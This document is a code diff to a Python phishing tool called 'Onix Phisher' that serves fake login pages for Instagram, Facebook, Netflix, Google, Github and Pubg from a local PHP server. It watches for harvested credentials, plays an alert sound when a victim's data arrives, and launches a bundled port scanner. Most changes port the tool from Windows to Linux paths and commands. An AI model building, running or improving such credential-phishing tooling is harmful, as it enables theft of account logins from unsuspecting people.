@@ -14,8 +14,8 @@ try:
     import keyboard
     
 except ImportError or ModuleNotFoundError:
-    install = input(f"{Fore.RED}unfortunately you dont have excepetd modules !!\n{Fore.GREEN}Want to install ? (y/n) :")
-    if install == "y" or install == "Y":
+    install = input(f"{Fore.RED}unfortunately you dont have excepetd modules !!\n{Fore.GREEN}Want to install ? (y/n) : ")
+    if install == "y":
         os.system("pip3 install colorama , playsound , pandas , keyboard , pywin32")
         sleep(0.5)
         pass
@@ -23,12 +23,14 @@ except ImportError or ModuleNotFoundError:
         exit(Fore.GREEN + "have a good day".title())
 
 #Change Title====================================================================================================
-os.system("title Onix Phisher")
-
+if os.name == "nt":
+    os.system("title Onix Phisher")
+else:
+    pass
 #build localhost====================================================================================================
 def php_server():
     with open("server" , "w") as log:
-        subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log)
+        subprocess.Popen((f"php -S localhost:{port}") , stderr=log , stdout=log)
 #build host====================================================================================================
 def loaclhost():
     global port
@@ -42,23 +44,30 @@ def Sprint(text):
     sys.stdout.flush()
     sleep(0.1)
 #Fullscreen ====================================================================================================
-getsize = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(getsize , win32con.SW_MAXIMIZE)
-#check php====================================================================================================
-check = subprocess.call("php -v" , stdout=subprocess.DEVNULL)
-
-if check != 0:
-    print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
-    sys.exit()
-
+if os.name == "nt":
+    getsize = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(getsize , win32con.SW_MAXIMIZE)
 else:
-    try:
-        os.system("cls")
-    except Exception:
-        os.system("clear")
-        pass
-    sleep(0.1)
     pass
+#check php====================================================================================================
+try:
+    check = subprocess.call("php -v" , stdout=subprocess.DEVNULL)
+
+    if check != 0:
+        print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
+        sys.exit()
+except FileNotFoundError:
+    pass
+
+
+if os.name == "nt":
+    os.system("cls")
+    pass
+else:
+    os.system("clear")
+    pass
+sleep(0.1)
+
 
 #Banner ====================================================================================================
 Banner_color = (Fore.RED , Fore.MAGENTA , Fore.BLUE , Fore.GREEN)
@@ -113,7 +122,7 @@ def zero_exit():
 def instagram():
     global port
     path = os.getcwd()
-    os.chdir(rf"{path}\instagram")
+    os.chdir(rf"{path}/instagram")
 
 
 #====================================================================================================
@@ -123,7 +132,10 @@ def instagram():
         exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
 #====================================================================================================
-    php_server()
+    if os.name == "nt":
+        php_server()
+    else:
+        php_server_linux()
 
     sleep(1)
 
@@ -145,12 +157,12 @@ def instagram():
             if size.st_size != 0:
                 
                 #play sound
-                os.chdir(r"..\Voice")
+                os.chdir(r"../Voice")
                 sound = playsound("T_connected.mp3")
                 t = threading.Thread(target=sound)
                 t.start()
                 sleep(0.5)
-                os.chdir(fr"{path}\instagram")
+                os.chdir(fr"{path}/instagram")
                 sleep(0.5)
 
                 
@@ -231,7 +243,7 @@ def facebook():
     global port
     
     path = os.getcwd()
-    os.chdir(rf"{path}\facebook")
+    os.chdir(rf"{path}/facebook")
 #====================================================================================================
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
@@ -259,12 +271,12 @@ def facebook():
             if size.st_size != 0:
 
                 #play sound
-                os.chdir(r"..\Voice")
+                os.chdir(r"../Voice")
                 sound = playsound("T_connected.mp3")
                 t = threading.Thread(target=sound)
                 t.start()
                 sleep(0.5)
-                os.chdir(fr"{path}\facebook")
+                os.chdir(fr"{path}/facebook")
                 sleep(0.5)
 
 
@@ -344,7 +356,7 @@ def netflix():
     global port
 
     path = os.getcwd()
-    os.chdir(rf"{path}\Netflix")
+    os.chdir(rf"{path}/Netflix")
 #====================================================================================================
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
@@ -373,12 +385,12 @@ def netflix():
             if size.st_size != 0:
 
                 #play sound
-                os.chdir(r"..\Voice")
+                os.chdir(r"../Voice")
                 sound = playsound("T_connected.mp3")
                 t = threading.Thread(target=sound)
                 t.start()
                 sleep(0.5)
-                os.chdir(fr"{path}\Netflix")
+                os.chdir(fr"{path}/Netflix")
                 sleep(0.5)
 
 
@@ -459,7 +471,7 @@ def Google():
     global port
     
     path = os.getcwd()
-    os.chdir(rf"{path}\Google")
+    os.chdir(rf"{path}/Google")
 #====================================================================================================
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
@@ -487,12 +499,12 @@ def Google():
             if size.st_size != 0:
 
                 #play sound
-                os.chdir(r"..\Voice")
+                os.chdir(r"../Voice")
                 sound = playsound("T_connected.mp3")
                 t = threading.Thread(target=sound)
                 t.start()
                 sleep(0.5)
-                os.chdir(fr"{path}\Google")
+                os.chdir(fr"{path}/Google")
                 sleep(0.5)
 
 
@@ -573,7 +585,7 @@ def Google():
 def Github():
     global port
     path = os.getcwd()
-    os.chdir(rf"{path}\Github")
+    os.chdir(rf"{path}/Github")
 #====================================================================================================
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
@@ -603,12 +615,12 @@ def Github():
             if size.st_size != 0:
 
                 #play sound
-                os.chdir(r"..\Voice")
+                os.chdir(r"../Voice")
                 sound = playsound("T_connected.mp3")
                 t = threading.Thread(target=sound)
                 t.start()
                 sleep(0.5)
-                os.chdir(fr"{path}\Github")
+                os.chdir(fr"{path}/Github")
                 sleep(0.5)
 
 
@@ -688,7 +700,7 @@ def Github():
 def Pubg():
     global port
     path = os.getcwd()
-    os.chdir(rf"{path}\Pubg")
+    os.chdir(rf"{path}/Pubg")
 #====================================================================================================
     try:
         port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
@@ -718,12 +730,12 @@ def Pubg():
             if size.st_size != 0:
 
                 #play sound
-                os.chdir(r"..\Voice")
+                os.chdir(r"../Voice")
                 sound = playsound("T_connected.mp3")
                 t = threading.Thread(target=sound)
                 t.start()
                 sleep(0.5)
-                os.chdir(fr"{path}\Pubg")
+                os.chdir(fr"{path}/Pubg")
                 sleep(0.5)
 
 
@@ -807,7 +819,7 @@ if ask == "0":
 if ask == "00":
 
     path_app = os.getcwd()
-    subprocess.call([f"{path_app}/Port_Scan/port_Scanner.exe"])
+    subprocess.call(f"{path_app}/Port_Scan/Port_Scanner.exe")
 
 if ask == "1":
     instagram()
